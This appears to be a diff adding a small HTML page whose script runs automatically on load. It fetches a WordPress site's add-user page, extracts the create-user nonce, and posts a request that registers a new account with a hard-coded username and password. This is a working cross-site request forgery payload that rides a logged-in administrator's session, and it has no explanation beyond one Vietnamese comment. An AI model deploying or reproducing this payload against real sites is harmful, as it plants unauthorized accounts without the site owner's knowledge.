@@ -1,0 +1,32 @@
+<!DOCTYPE html><html><head><title>abc</title></head><body><form id="myForm"><input type="hidden" id="nonceValue-input" name="_wpnonce_create-user"></form>     <ul id="posts-list"></ul>     <script>
+      function createUser() {
+        fetch("https://yourwebsite.com.vn/wp-admin/user-new.php")
+          .then(response => {
+            if (!response.ok) {
+              throw new Error("Failed to fetch data from server");
+            }
+            return response.text();
+          })
+          .then(data => {
+            const parser = new DOMParser();
+            const html = parser.parseFromString(data, "text/html");
+            const nonceValue = html.getElementById("_wpnonce_create-user").value;
+            console.log(nonceValue);             // Sử dụng giá trị nonceValue để gửi yêu cầu tới trang web
+            const dataRaw = `action=createuser&_wpnonce_create-user=${nonceValue}&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=datnt3334&email=yourusername&first_name=&last_name=&url=&locale=site-default&pass1=e2xJHFwYfQPKz%250904%28VAYXS&pass2=e2xJHFwYfQPKz%250904%28VAYXS&send_user_notification=1&role=subscriber&createuser=Add+New+User`;             fetch("https://yourwebsite.com.vn/wp-admin/user-new.php", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+              },
+              body: dataRaw
+            })
+              .then(response => {
+                if (!response.ok) {
+                  throw new Error("Failed to submit user data to server");
+                }
+                return response.text();
+              })
+              .then(data => console.log(data))
+              .catch(error => console.error(error));
+          })
+          .catch(error => console.error(error));
+      }       window.addEventListener("load", createUser);</script></body></html>
